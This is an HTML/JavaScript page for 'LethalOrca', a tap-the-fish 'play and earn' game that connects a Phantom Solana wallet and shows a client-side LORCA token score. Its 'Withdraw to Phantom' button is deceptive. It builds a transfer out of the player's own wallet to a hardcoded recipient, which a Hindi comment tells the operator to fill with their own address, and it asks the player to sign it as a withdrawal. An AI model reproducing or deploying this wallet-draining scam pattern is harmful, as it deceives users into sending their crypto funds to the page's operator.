<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LethalOrca - Play & Earn</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #0a3d5c, #1b9eb8); height: 100vh; overflow: hidden; }
        .container { width: 100%; height: 100vh; position: relative; }
        
        /* Top Bar */
        .top-bar { position: absolute; top: 0; left: 0; right: 0; padding: 20px; background: rgba(0, 0, 0, 0.5); display: flex; justify-content: space-between; align-items: center; z-index: 100; }
        .top-bar-left { display: flex; gap: 30px; align-items: center; color: white; font-size: 18px; font-weight: bold; }
        .logo-box { width: 36px; height: 36px; border: 2px solid cyan; border-radius: 50%; display: flex; align-items: center; justify-content: center; background: rgba(0, 212, 255, 0.1); flex-shrink: 0; }
        .timer { color: white; font-size: 20px; font-weight: bold; }
        .wallet-btn { background: linear-gradient(135deg, cyan, #00a8cc); color: black; border: 2px solid cyan; padding: 12px 24px; border-radius: 20px; font-weight: bold; cursor: pointer; font-size: 14px; transition: all 0.3s; box-shadow: 0 0 10px rgba(0, 212, 255, 0.3); }
        .wallet-btn:hover { transform: scale(1.05); box-shadow: 0 0 20px rgba(0, 212, 255, 0.6); }

        /* Start Screen */
        #startScreen { position: absolute; inset: 0; background: rgba(0, 0, 0, 0.9); display: flex; flex-direction: column; align-items: center; justify-content: center; color: white; z-index: 200; text-align: center; }
        #startScreen h1 { font-size: 50px; margin-bottom: 20px; }
        #startScreen p { font-size: 18px; margin-bottom: 30px; max-width: 400px; }
        .start-btn { background: cyan; color: black; border: none; padding: 15px 40px; font-size: 18px; font-weight: bold; cursor: pointer; border-radius: 10px; }
        .start-btn:hover { opacity: 0.8; }

        /* Game Area */
        .game-area { position: absolute; top: 70px; left: 0; right: 0; bottom: 0; background: inherit; overflow: hidden; }
        
        /* Wallet Modal Styling */
        .wallet-modal { position: fixed; inset: 0; background: rgba(0,0,0,0.8); display: none; align-items: center; justify-content: center; z-index: 300; }
        .wallet-box { background: #0a3d5c; border: 2px solid cyan; padding: 30px; border-radius: 15px; color: white; text-align: center; width: 350px; }
        .withdraw-btn { background: lime; color: black; border: none; padding: 10px 20px; font-weight: bold; border-radius: 10px; cursor: pointer; margin-top: 15px; width: 100%; }
    </style>
</head>
<body>

    <div class="container">
        <!-- Top Bar -->
        <div class="top-bar">
            <div class="top-bar-left">
                <div class="logo-box">🐋</div>
                <div id="scoreDisplay">0 LORCA</div>
                <div class="timer" id="timerDisplay">30</div>
            </div>
            <button class="wallet-btn" id="walletBtn">Connect Wallet</button>
        </div>

        <!-- Start Screen -->
        <div id="startScreen">
            <h1>🐋 LethalOrca</h1>
            <p>Tap fish to earn LORCA tokens! You have 30 seconds.</p>
            <button class="start-btn" id="startBtn">Start Fishing</button>
        </div>

        <div class="game-area" id="gameArea"></div>
    </div>

    <!-- Wallet Panel / Modal -->
    <div class="wallet-modal" id="walletModal">
        <div class="wallet-box">
            <h3>Wallet Details</h3>
            <p id="walletAddressText" style="margin: 15px 0; font-size: 14px; color: cyan;">Not Connected</p>
            <p>Balance: <span id="balanceText">0</span> LORCA</p>
            <button class="withdraw-btn" id="withdraw-btn">Withdraw to Phantom</button>
            <button onclick="document.getElementById('walletModal').style.display='none'" style="margin-top: 10px; background: transparent; color: white; border: none; cursor: pointer;">Close [X]</button>
        </div>
    </div>

    <!-- Solana Web3 CDN -->
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>

    <script>
        let score = 0;
        let timeLeft = 30;
        let gameInterval;
        let timerInterval;
        let isConnected = false;
        let userPublicKey = null;

        const startBtn = document.getElementById('startBtn');
        const startScreen = document.getElementById('startScreen');
        const scoreDisplay = document.getElementById('scoreDisplay');
        const timerDisplay = document.getElementById('timerDisplay');
        const gameArea = document.getElementById('gameArea');
        const walletBtn = document.getElementById('walletBtn');
        const walletModal = document.getElementById('walletModal');

        // Start Game
        startBtn.addEventListener('click', () => {
            startScreen.style.display = 'none';
            score = 0;
            timeLeft = 30;
            scoreDisplay.innerText = score + " LORCA";
            timerDisplay.innerText = timeLeft;
            
            startGameTimer();
            spawnFish();
        });

        function startGameTimer() {
            timerInterval = setInterval(() => {
                timeLeft--;
                timerDisplay.innerText = timeLeft;
                if (timeLeft <= 0) {
                    clearInterval(timerInterval);
                    clearInterval(gameInterval);
                    gameArea.innerHTML = "";
                    alert("Time's Up! You earned " + score + " LORCA!");
                    startScreen.style.display = 'flex';
                }
            }, 1000);
        }

        function spawnFish() {
            gameInterval = setInterval(() => {
                const fish = document.createElement('div');
                fish.innerText = Math.random() > 0.5 ? '🐟' : '🐡';
                fish.style.position = 'absolute';
                fish.style.fontSize = '30px';
                fish.style.cursor = 'pointer';
                fish.style.left = Math.random() * (gameArea.clientWidth - 50) + 'px';
                fish.style.top = Math.random() * (gameArea.clientHeight - 50) + 'px';
                
                fish.addEventListener('click', () => {
                    score += 100;
                    scoreDisplay.innerText = score + " LORCA";
                    fish.remove();
                });

                gameArea.appendChild(fish);
                setTimeout(() => { fish.remove(); }, 2000);
            }, 800);
        }

        // Wallet Connection
        walletBtn.addEventListener('click', async () => {
            try {
                const provider = window.solana;
                if (!provider || !provider.isPhantom) {
                    alert("Please install Phantom Wallet!");
                    window.open("https://phantom.app/", "_blank");
                    return;
                }
                const response = await provider.connect();
                userPublicKey = response.publicKey.toString();
                isConnected = true;
                walletBtn.innerText = "✓ Connected";
                document.getElementById('walletAddressText').innerText = userPublicKey.slice(0, 4) + "..." + userPublicKey.slice(-4);
                walletModal.style.display = 'flex';
            } catch (err) {
                console.error(err);
            }
        });

        walletBtn.addEventListener('dblclick', () => {
            walletModal.style.display = 'flex';
        });

        // Withdrawal Function
        async function withdrawTokens() {
            try {
                const provider = window.solana;
                if (!provider || !provider.isPhantom) {
                    alert("Please install Phantom Wallet!");
                    return;
                }

                await provider.connect();
                const pubKey = provider.publicKey;

                if (score <= 0) {
                    alert("Play and earn some LORCA tokens first!");
                    return;
                }

                const connection = new solanaWeb3.Connection(
                    solanaWeb3.clusterApiUrl('devnet'),
                    'confirmed'
                );

                // Yahan apna Phantom wallet address dalein jahan tokens receive karne hain
                const recipientPubKey = new solanaWeb3.PublicKey("APNA_PHANTOM_WALLET_ADDRESS_YAHAN_DALEIN");

                const transaction = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: pubKey,
                        toPubkey: recipientPubKey,
                        lamports: solanaWeb3.LAMPORTS_PER_SOL * 0.0001, 
                    })
                );

                const { blockhash } = await connection.getLatestBlockhash();
                transaction.recentBlockhash = blockhash;
                transaction.feePayer = pubKey;

                const signedTransaction = await provider.signTransaction(transaction);
                const signature = await connection.sendRawTransaction(signedTransaction.serialize());
                
                await connection.confirmTransaction(signature);
                alert("Withdrawal Successful! Signature: " + signature);

            } catch (err) {
                console.error(err);
                alert("Withdrawal failed: " + err.message);
            }
        }

        document.getElementById("withdraw-btn").addEventListener("click", withdrawTokens);
    </script>
</body>
</html>
